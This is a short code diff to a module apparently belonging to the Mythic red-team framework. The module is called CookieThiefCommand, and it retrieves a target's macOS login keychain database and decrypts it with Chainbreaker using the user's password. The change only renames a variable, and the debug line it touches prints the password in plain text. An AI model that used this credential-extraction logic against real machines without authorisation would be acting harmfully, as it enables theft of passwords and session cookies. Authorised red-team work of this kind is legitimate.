@@ -60,9 +60,9 @@ class CookieThiefCommand(CommandBase):
         pass
 
     async def downloads_complete(self, task: MythicTask, subtask: dict = None, subtask_group_name: str = None) -> MythicTask:
-        password = task.args.get_arg("User Login Password")
+        k_password = task.args.get_arg("User Login Password")
         ##DEBUG:
-        print("Password: " + password)
+        print("Password: " + str(k_password))
         sys.stdout.flush()
         getkeychainDBResp = await MythicRPC().execute("get_file", task_id=task.id,filename="login.keychain-db", limit_by_callback=True, max_results=1, get_contents=True)
         if getkeychainDBResp.status == "success":
@@ -81,7 +81,7 @@ class CookieThiefCommand(CommandBase):
 
 
         try:
-            keychain = Chainbreaker("/Mythic/mythic/tmp_login.keychain-db", unlock_password=password, unlock_key=None,
+            keychain = Chainbreaker("/Mythic/mythic/tmp_login.keychain-db", unlock_password=k_password, unlock_key=None,
                                     unlock_file=None)
 
             keychainoutput = []
